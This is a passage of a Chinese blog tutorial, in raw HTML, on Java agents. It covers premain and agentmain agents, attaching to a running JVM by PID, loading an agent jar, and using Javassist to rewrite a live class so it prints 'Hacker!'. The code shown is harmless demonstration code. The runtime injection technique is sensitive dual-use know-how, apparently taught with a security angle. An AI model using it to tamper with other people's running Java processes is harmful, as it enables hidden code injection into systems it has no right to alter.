class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_premain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span> ; i&lt;<span class="number">10</span> ; i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;调用了premain-Agent！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着在resource/META-INF/下创建MANIFEST.MF清单文件用以指定premain-Agent的启动类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Premain-Class: com.java.premain.agent.Java_Agent_premain</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>将其打包成jar文件</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067514381-4045842b-638b-40ea-8ebf-37cac288d151.png" alt=""><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067525182-1ce5a737-b3cb-462f-ba62-47a213388bcb.png" alt=""></p><p>然后直接build就可以了</p><p>创建一个目标类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加JVM Options（注意冒号之后不能有空格）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-javaagent:<span class="string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span></span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067589774-a75d3cf2-f437-464d-87de-0d16e55c801f.png" alt=""></p><h4 id="agentmain-Agent">agentmain-Agent</h4><p>相较于premain-Agent只能在JVM启动前加载，agentmain-Agent能够在JVM启动之后加载并实现相应的修改字节码功能。下面我们来了解一下和JVM有关的两个类。</p><h5 id="VirtualMachine类">VirtualMachine类</h5><p>com.sun.tools.attach.VirtualMachine类可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。</p><p>该类允许我们通过给attach方法传入一个JVM的PID，来远程连接到该JVM上 ，之后我们就可以对连接的JVM进行各种操作，如注入Agent。下面是该类的主要方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//允许我们传入一个JVM的PID，然后远程连接到该JVM上</span></span><br><span class="line">VirtualMachine.attach()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理</span></span><br><span class="line">VirtualMachine.loadAgent()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//获得当前所有的JVM列表</span></span><br><span class="line">VirtualMachine.list()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//解除与特定JVM的连接</span></span><br><span class="line">VirtualMachine.detach()</span><br></pre></td></tr></table></figure><h5 id="VirtualMachineDescriptor类">VirtualMachineDescriptor类</h5><p>com.sun.tools.attach.VirtualMachineDescriptor类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">get_PID</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID</span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;get_PID&quot;</span>))</span><br><span class="line">            System.out.println(vmd.id());</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">##</span><br><span class="line"><span class="number">4908</span></span><br><span class="line"> </span><br><span class="line">Process finished with exit code <span class="number">0</span></span><br></pre></td></tr></table></figure><p>下面我们就来实现一个agentmain-Agent。首先我们编写一个Hello类，模拟正在运行的JVM</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            hello();</span><br><span class="line">            sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同时配置MANIFEST.MF文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.agentmain.agent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_agentmain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;调用了agentmain-Agent!&quot;</span>);</span><br><span class="line">            sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时配置MANIFEST.MF文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Agent-Class: com.java.agentmain.agent.Java_Agent_agentmain</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>编译打包成jar文件out/artifacts/Java_Agent_jar/Java_Agent.jar</p><p>最后编写一个Inject_Agent类，获取特定JVM的PID并注入Agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.inject;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;Sleep_Hello&quot;</span>))&#123;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//连接指定JVM</span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                <span class="comment">//加载Agent</span></span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span>);</span><br><span class="line">                <span class="comment">//断开JVM连接</span></span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067723017-18de439f-c450-4b2c-8958-9db93b21ac2a.png" alt=""></p><h4 id="Instrumentation">Instrumentation</h4><p>Instrumentation是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067744447-044667fb-715a-499d-a6a9-7e2506ed036e.png" alt=""></p><p>其在Java中是一个接口，常用方法如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="type">boolean</span> canRetransform)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//判断一个类是否被修改</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//获取一个对象的大小</span></span><br><span class="line">    <span class="type">long</span> <span class="title function_">getObjectSize</span><span class="params">(Object objectToSize)</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="获取目标JVM已加载类">获取目标JVM已加载类</h5><p>下面我们简单实现一个能够获取目标JVM已加载类的agentmain-Agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.agentmain.instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_agentmain_Instrumentation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        Class [] classes = inst.getAllLoadedClasses();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(Class cls : classes)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;------------------------------------------&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;加载类: &quot;</span>+cls.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;是否可被修改: &quot;</span>+inst.isModifiableClass(cls));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Hello World!</span><br><span class="line">Hello World!</span><br><span class="line">------------------------------------------</span><br><span class="line">加载类: com.java.agentmain.instrumentation.Java_Agent_agentmain_Instrumentation</span><br><span class="line">是否可被修改: <span class="literal">true</span></span><br><span class="line">------------------------------------------</span><br><span class="line">加载类: Sleep_Hello</span><br><span class="line">是否可被修改: <span class="literal">true</span></span><br><span class="line">------------------------------------------</span><br><span class="line">加载类: com.intellij.rt.execution.application.AppMainV2$<span class="number">1</span></span><br><span class="line">是否可被修改: <span class="literal">true</span></span><br><span class="line">------------------------------------------</span><br><span class="line">加载类: com.intellij.rt.execution.application.AppMainV2</span><br><span class="line">是否可被修改: <span class="literal">true</span></span><br><span class="line">------------------------------------------</span><br><span class="line">加载类: com.intellij.rt.execution.application.AppMainV2$Agent</span><br><span class="line">是否可被修改: <span class="literal">true</span></span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ClassFileTransformer接口中只有一个transform()方法，返回值为字节数组，作为转换后的字节码注入到目标JVM中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 类文件转换方法，重写transform方法可获取到待加载的类相关信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loader              定义要转换的类加载器；如果是引导加载器如Bootstrap ClassLoader，则为 null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className           完全限定类内部形式的类名称,格式如:java/lang/Runtime</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> protectionDomain    要定义或重定义的类的保护域</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classfileBuffer     类文件格式的输入字节缓冲区（不得修改）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回一个通过ASM修改后添加了防御代码的字节码byte数组。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">byte</span>[] transform(  ClassLoader         loader,</span><br><span class="line">                String              className,</span><br><span class="line">                Class&lt;?&gt;            classBeingRedefined,</span><br><span class="line">                ProtectionDomain    protectionDomain,</span><br><span class="line">                <span class="type">byte</span>[]              classfileBuffer)</span><br><span class="line">        <span class="keyword">throws</span> IllegalClassFormatException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在通过 addTransformer 注册一个transformer后，每次定义或者重定义新类都会调用transformer。所谓定义，即是通过ClassLoader.defineClass加载进来的类。而重定义是通过Instrumentation.redefineClasses方法重定义的类。</p><p>当存在多个转换器时，转换将由 transform 调用链组成。 也就是说，一个 transform 调用返回的 byte 数组将成为下一个调用的输入（通过 classfileBuffer 参数）。</p><p>转换将按以下顺序应用：</p><ul><li>不可重转换转换器</li><li>不可重转换本机转换器</li><li>可重转换转换器</li><li>可重转换本机转换器</li></ul><p>至于transformer中对字节码的具体操作，则需要使用到Javassisit类。在<a href="https://goodapple.top/archives/1145#header-id-20">这篇文章</a>中，我已经介绍过了Javassist的用法。下面我就来修改一个正在运行JVM的字节码。</p><h5 id="修改目标JVM的Class字节码">修改目标JVM的Class字节码</h5><p>首先编写一个目标类com.sleep.hello.Sleep_Hello.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            hello();</span><br><span class="line">            sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编写一个agentmain-Agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">java_agent_agentmain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException, UnmodifiableClassException &#123;</span><br><span class="line">        Class [] classes = inst.getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取目标JVM加载的全部类</span></span><br><span class="line">        <span class="keyword">for</span>(Class cls : classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (cls.getName().equals(<span class="string">&quot;org.example.hello&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//添加一个transformer到Instrumentation，并重新触发目标类加载</span></span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">Hello_Transform</span>(),<span class="literal">true</span>);</span><br><span class="line">                inst.retransformClasses(cls);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>继承ClassFileTransformer类编写一个transformer，修改对应类的字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello_Transform</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取CtClass 对象的容器 ClassPool</span></span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加额外的类搜索路径</span></span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">ccp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);</span><br><span class="line">                classPool.insertClassPath(ccp);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取目标类</span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.example.hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取目标方法</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置方法体</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&#123;System.out.println(\&quot;Hacker!\&quot;);&#125;&quot;</span>;</span><br><span class="line">            ctMethod.setBody(body);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//返回目标类字节码</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = 